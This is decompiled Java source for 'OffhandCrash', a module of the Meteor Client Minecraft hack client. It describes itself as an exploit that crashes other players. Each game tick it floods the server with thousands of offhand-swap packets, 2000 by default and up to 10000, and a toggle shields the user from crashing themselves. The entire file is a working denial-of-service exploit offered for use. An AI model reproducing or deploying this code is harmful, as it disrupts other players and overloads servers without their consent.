package meteordevelopment.meteorclient.systems.modules.player;

import io.netty.channel.Channel;
import java.util.Objects;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_2846;

/* JADX INFO: loaded from: meteor-client-1.21.5-local.jar:meteordevelopment/meteorclient/systems/modules/player/OffhandCrash.class */
public class OffhandCrash extends Module {
    private static final class_2846 PACKET = new class_2846(class_2846.class_2847.field_12969, new class_2338(0, 0, 0), class_2350.field_11036);
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> doCrash;
    private final Setting<Integer> speed;
    private final Setting<Boolean> antiCrash;

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.doCrash = this.sgGeneral.add(new BoolSetting.Builder().name("do-crash").description("Sends X number of offhand swap sound packets to the server per tick.").defaultValue(true).build());
        SettingGroup settingGroup = this.sgGeneral;
        IntSetting.Builder builderSliderRange = new IntSetting.Builder().name("speed").description("The amount of swaps per tick.").defaultValue(2000).min(1).sliderRange(1, 10000);
        Setting<Boolean> setting = this.doCrash;
        Objects.requireNonNull(setting);
        this.speed = settingGroup.add(builderSliderRange.visible(setting::get).build());
        this.antiCrash = this.sgGeneral.add(new BoolSetting.Builder().name("anti-crash").description("Attempts to prevent you from crashing yourself.").defaultValue(true).build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (this.doCrash.get().booleanValue()) {
            Channel channel = this.mc.field_1724.field_3944.method_48296().getChannel();
            for (int i = 0; i < this.speed.get().intValue(); i++) {
                channel.write(PACKET);
            }
            channel.flush();
        }
    }

    public boolean isAntiCrash() {
        return isActive() && this.antiCrash.get().booleanValue();
    }
}
